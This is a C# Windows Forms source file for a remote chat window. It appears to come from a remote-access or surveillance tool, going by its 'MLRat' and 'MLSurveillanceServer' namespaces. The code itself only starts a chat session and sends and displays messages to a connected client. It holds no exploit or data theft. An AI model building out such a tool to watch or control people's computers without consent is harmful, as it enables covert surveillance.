using MLRat.Server;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLSurveillanceServer.Forms
{
    public partial class RemoteChatForm : Form
    {
        public IClient client { get; private set; }
        public RemoteChatForm(IClient _client)
        {
            client = _client;
            InitializeComponent();
        }

        void AddMessage(string s, params object[] args)
        {
            chatLog.Text += string.Format(s, args) + Environment.NewLine;
        }

        public void NewChat(string message)
        {
            this.Invoke((MethodInvoker)delegate ()
            {
                AddMessage("Client: {0}", message);
            });
        }

        private void remoteChatForm_Load(object sender, EventArgs e)
        {
            client.Send((byte)NetworkCommand.RemoteChat, (byte)RemoteChatCommand.Start);
            AddMessage("Chat started");
        }

        private void inputBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            
        }

        private void inputBox_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Enter && inputBox.Text != string.Empty)
            {
                client.Send((byte)NetworkCommand.RemoteChat, (byte)RemoteChatCommand.Message, inputBox.Text);
                AddMessage("YOU: {0}", inputBox.Text);
                inputBox.Text = "";
            }
        }

        private void inputBox_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
